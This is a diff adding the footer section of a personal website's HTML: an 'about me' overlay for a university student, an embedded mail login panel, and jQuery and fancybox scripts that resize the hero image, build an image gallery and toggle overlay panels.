+	<!-- ============================ END Footer =========================== -->
+	<!-- =============================== About ============================= -->
+	<div id="bgabout"></div>
+	<div id="aboutme">
+		<img id="aboutme-picture" src="/img/favicon.ico"/>
+		<img id="aboutme-close" src="/img/close-black.png" onclick="hidediv();"/>
+		<h4 id="aboutme-name">
+			hnyyghk<br>葛弘康
+		</h4>
+		<h5 id="aboutme-learn">
+			<p>
+				华中科技大学
+				<br>
+				电子信息与通信学院
+			</p>
+		</h5>
+	</div>
+	<!-- =========================== END About ============================= -->
+	<!-- =============================== Mail ============================== -->
+	<script type="text/javascript" src="/js/outerlogin.js"  charset="gb18030"></script>
+	<script type="text/javascript">writeLoginPanel({domainlist:"5icodes.com", mode:"horizontal"});</script>
+	<!-- =========================== END Mail ============================= -->
+	<!-- Load our scripts -->
+	<!-- Resizable 'on-demand' full-height hero -->
+	<script type="text/javascript">
+	    var resizeHero = function () {
+	        var hero = $(".cover,.heightblock"),
+	            window1 = $(window);
+	        hero.css({
+	            "height": window1.height()
+	        });
+	    };
+	    
+	    resizeHero();
+	    
+	    $(window).resize(function () {
+	        resizeHero();
+	    });
+	</script>
+	<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+	<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+	<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+	<script src="/fancybox/jquery.fancybox.pack.js"></script>
+	<script type="text/javascript">
+		$('#intro').find('img').each(function(){
+		  var alt = this.alt;
+
+		  if (alt){
+			$(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+		  }
+
+		  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+		});
+		(function($){
+		  $('.fancybox').fancybox();
+		})(jQuery);
+	</script>
+
+	<!-- DIV CSS遮罩 -->
+	<script type="text/javascript">
+		function showdiv() {
+			document.getElementById("bgabout").style.display ="block";
+			document.getElementById("aboutme").style.display ="block";
+
+			document.getElementById("intro").style.display ='none';
+			document.getElementById("statement").style.display ='none';
+			document.getElementById("footer").style.display ='none';
+			document.getElementById("ascrail2000").style.display ='none';
+		}
+		function showdivmail() {
+			document.getElementById("bg").style.display ="block";
+			document.getElementById("about").style.display ="block";
+
+			document.getElementById("intro").style.display ='none';
+			document.getElementById("statement").style.display ='none';
+			document.getElementById("footer").style.display ='none';
+			document.getElementById("ascrail2000").style.display ='none';
+		}
+		function hidediv() {
+			document.getElementById("bgabout").style.display ='none';
+			document.getElementById("aboutme").style.display ='none';
+
+			document.getElementById("intro").style.display ="block";
+			document.getElementById("statement").style.display ="block";
+			document.getElementById("footer").style.display ="block";
+			document.getElementById("ascrail2000").style.display ="block";
+		}
+		function hidedivmail() {
+			document.getElementById("bg").style.display ='none';
+			document.getElementById("about").style.display ='none';
+
+			document.getElementById("intro").style.display ="block";
+			document.getElementById("statement").style.display ="block";
+			document.getElementById("footer").style.display ="block";
+			document.getElementById("ascrail2000").style.display ="block";
+		}
+	</script>
+</body>
+</html>
